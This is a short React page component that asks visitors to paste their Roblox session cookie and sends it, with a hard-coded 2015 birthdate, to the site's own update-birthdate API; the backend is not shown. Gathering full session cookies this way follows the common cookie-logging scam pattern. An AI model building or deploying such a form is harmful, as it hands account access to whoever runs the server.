import { useState } from "react";

export default function Home() {
  const [cookie, setCookie] = useState("");
  const [result, setResult] = useState("");

  async function handleSubmit(e) {
    e.preventDefault();

    const res = await fetch("/api/update-birthdate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cookie,
        month: 6,
        day: 5,
        year: 2015
      })
    });

    const data = await res.json();
    setResult(JSON.stringify(data));
  }

  return (
    <div style={{ padding: "2rem", fontFamily: "Arial" }}>
      <h2>Update Roblox Birthdate</h2>
      <form onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="Enter Roblox Cookie"
          value={cookie}
          onChange={(e) => setCookie(e.target.value)}
          style={{ width: "300px" }}
          required
        /><br /><br />
        <button type="submit">Submit</button>
      </form>
      <p style={{ marginTop: "1rem" }}>{result}</p>
    </div>
  );
}
